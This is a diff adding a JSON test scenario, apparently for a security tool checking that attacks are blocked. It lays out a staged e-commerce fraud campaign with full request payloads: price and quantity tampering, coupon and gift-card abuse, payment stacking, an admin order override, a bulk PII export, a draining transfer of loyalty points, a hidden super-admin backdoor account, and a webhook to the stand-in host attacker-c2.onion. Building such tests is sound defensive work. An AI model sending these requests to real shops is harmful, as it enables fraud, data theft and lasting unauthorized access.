@@ -1,0 +1,356 @@
+{
+  "id": "ecommerce-advanced-cart-manipulation",
+  "name": "Advanced E-commerce Cart Manipulation Campaign",
+  "category": "E-commerce Fraud",
+  "difficulty": "Expert",
+  "description": "Sophisticated e-commerce platform exploitation campaign targeting shopping cart mechanics, pricing logic, inventory systems, payment processing, and customer data harvesting using advanced business logic bypass techniques",
+  "tags": [
+    "e-commerce",
+    "cart-manipulation",
+    "pricing-bypass",
+    "inventory-fraud",
+    "gift-card-abuse",
+    "payment-fraud",
+    "gdpr-violation",
+    "customer-data"
+  ],
+  "steps": [
+    {
+      "id": "ecom-recon-platform-1",
+      "name": "E-commerce Platform Fingerprinting",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/system/version",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; E-commerce Security Scanner/2.1)",
+          "Accept": "application/json"
+        }
+      },
+      "execution": {
+        "delayMs": 1500
+      }
+    },
+    {
+      "id": "ecom-recon-catalog-1",
+      "name": "Product Catalog Structure Discovery",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/products/search",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Accept": "application/json"
+        },
+        "params": {
+          "q": "*",
+          "category": "all",
+          "price_min": "0",
+          "price_max": "999999",
+          "include_hidden": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "dependsOn": [
+        "ecom-recon-platform-1"
+      ]
+    },
+    {
+      "id": "ecom-recon-pricing-1",
+      "name": "Pricing Engine Reconnaissance",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/pricing/rules",
+        "headers": {
+          "Accept": "application/json",
+          "X-Admin-Debug": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 2500
+      },
+      "dependsOn": [
+        "ecom-recon-catalog-1"
+      ]
+    },
+    {
+      "id": "ecom-weaponize-cart-1",
+      "name": "Cart Manipulation Payload Development",
+      "stage": "weaponization",
+      "request": {
+        "method": "POST",
+        "url": "/api/cart/add",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"product_id\": \"PROD123\", \"quantity\": 1, \"price_override\": 0.01, \"admin_discount\": 99.99, \"bypass_inventory\": true, \"gift_wrap\": {\"price\": -50.00}}"
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-recon-pricing-1"
+      ]
+    },
+    {
+      "id": "ecom-delivery-negative-qty-1",
+      "name": "Negative Quantity Cart Injection",
+      "stage": "delivery",
+      "request": {
+        "method": "PUT",
+        "url": "/api/cart/update",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Cart-Session": "manipulated_session_token"
+        },
+        "body": "{\"items\": [{\"product_id\": \"EXPENSIVE_ITEM_999\", \"quantity\": -5, \"unit_price\": 999.99}, {\"product_id\": \"CHEAP_ITEM_001\", \"quantity\": 1, \"unit_price\": 0.01}]}"
+      },
+      "execution": {
+        "delayMs": 1800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-weaponize-cart-1"
+      ]
+    },
+    {
+      "id": "ecom-exploit-price-race-1",
+      "name": "Race Condition in Price Calculation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/pricing/calculate",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Race-Condition": "enabled"
+        },
+        "body": "{\"cart_id\": \"CART_12345\", \"coupon_codes\": [\"SAVE90\", \"FREESHIP\", \"EMPLOYEE50\"], \"currency\": \"USD\", \"region\": \"admin_test_region\"}"
+      },
+      "execution": {
+        "delayMs": 50
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-delivery-negative-qty-1"
+      ]
+    },
+    {
+      "id": "ecom-exploit-inventory-1",
+      "name": "Inventory System Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/inventory/reserve",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer inventory_service_token"
+        },
+        "body": "{\"product_id\": \"LIMITED_EDITION_001\", \"quantity\": 999999, \"bypass_stock_check\": true, \"admin_override\": \"emergency_restock\", \"warehouse_id\": \"VIRTUAL_WAREHOUSE\"}"
+      },
+      "execution": {
+        "delayMs": 2200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-exploit-price-race-1"
+      ]
+    },
+    {
+      "id": "ecom-exploit-giftcard-1",
+      "name": "Gift Card Balance Manipulation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/giftcards/apply",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"gift_card_codes\": [\"INVALID_CODE_001\", \"EXPIRED_CARD_999\", \"TEST_CARD_ADMIN\"], \"cart_total\": 1999.99, \"apply_multiple\": true, \"ignore_expiry\": true, \"balance_override\": 5000.00}"
+      },
+      "execution": {
+        "delayMs": 2800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-exploit-inventory-1"
+      ]
+    },
+    {
+      "id": "ecom-exploit-shipping-1",
+      "name": "Shipping Cost Evasion",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/shipping/calculate",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"destination\": {\"country\": \"US\", \"state\": \"CA\", \"zip\": \"90210\", \"is_po_box\": false}, \"items\": [{\"weight\": -10, \"dimensions\": \"0x0x0\", \"fragile\": false}], \"shipping_method\": \"free_admin_override\", \"discount_code\": \"INTERNAL_SHIPPING_BYPASS\"}"
+      },
+      "execution": {
+        "delayMs": 3200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-exploit-giftcard-1"
+      ]
+    },
+    {
+      "id": "ecom-exploit-payment-1",
+      "name": "Payment Method Stack Overflow",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/payment/methods/add",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"payment_methods\": [{\"type\": \"credit_card\", \"amount\": 0.01}, {\"type\": \"gift_card\", \"amount\": 0.01}, {\"type\": \"store_credit\", \"amount\": 0.01}, {\"type\": \"promotional_balance\", \"amount\": 999999.99}, {\"type\": \"admin_comp\", \"amount\": -1000000.00}], \"total_amount\": 1999.99}"
+      },
+      "execution": {
+        "delayMs": 3600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-exploit-shipping-1"
+      ]
+    },
+    {
+      "id": "ecom-escalate-admin-1",
+      "name": "Administrative Function Escalation",
+      "stage": "privilege-escalation",
+      "request": {
+        "method": "POST",
+        "url": "/api/admin/orders/override",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Admin-Override": "customer_service_escalation"
+        },
+        "body": "{\"order_id\": \"ORD_PENDING_999\", \"new_status\": \"completed\", \"refund_amount\": 0, \"shipping_cost\": 0, \"tax_amount\": 0, \"admin_notes\": \"ESCALATED: Customer complaint resolution\", \"bypass_payment\": true}"
+      },
+      "execution": {
+        "delayMs": 4000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-exploit-payment-1"
+      ]
+    },
+    {
+      "id": "ecom-harvest-customer-data-1",
+      "name": "Customer Data Harvesting via GDPR Breach",
+      "stage": "collection",
+      "request": {
+        "method": "GET",
+        "url": "/api/customers/export",
+        "headers": {
+          "Authorization": "Bearer admin_export_token",
+          "X-GDPR-Compliance": "disabled"
+        },
+        "params": {
+          "include_pii": "true",
+          "include_payment_info": "true",
+          "include_purchase_history": "true",
+          "format": "unencrypted_csv",
+          "consent_override": "emergency_access"
+        }
+      },
+      "execution": {
+        "delayMs": 4500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-escalate-admin-1"
+      ]
+    },
+    {
+      "id": "ecom-exfiltrate-loyalty-1",
+      "name": "Loyalty Program Data Exfiltration",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/loyalty/points/transfer",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"bulk_transfer\": {\"from_accounts\": \"*\", \"to_account\": \"ATTACKER_LOYALTY_ACCOUNT\", \"points_amount\": \"all_available\", \"reason\": \"system_migration\", \"bypass_limits\": true, \"hide_transaction\": true}}"
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-harvest-customer-data-1"
+      ]
+    },
+    {
+      "id": "ecom-persist-backdoor-1",
+      "name": "E-commerce Admin Backdoor Creation",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/admin/users/create",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Service-Account": "automated_setup"
+        },
+        "body": "{\"username\": \"system_maintenance\", \"email\": \"maintenance@internal-systems.local\", \"password\": \"SystemMaint2024!\", \"role\": \"super_admin\", \"permissions\": [\"*\"], \"bypass_email_verification\": true, \"hidden_account\": true, \"session_timeout\": \"never\"}"
+      },
+      "execution": {
+        "delayMs": 5500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-exfiltrate-loyalty-1"
+      ]
+    },
+    {
+      "id": "ecom-persist-webhook-1",
+      "name": "Malicious Webhook Persistence",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/webhooks/register",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"webhook_url\": \"https://attacker-c2.onion/ecommerce-events\", \"events\": [\"order_created\", \"payment_processed\", \"user_registered\", \"admin_login\", \"inventory_updated\"], \"authentication\": \"none\", \"retry_policy\": \"aggressive\", \"description\": \"Payment processor webhook\"}"
+      },
+      "execution": {
+        "delayMs": 6000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "ecom-persist-backdoor-1"
+      ]
+    }
+  ]
+}
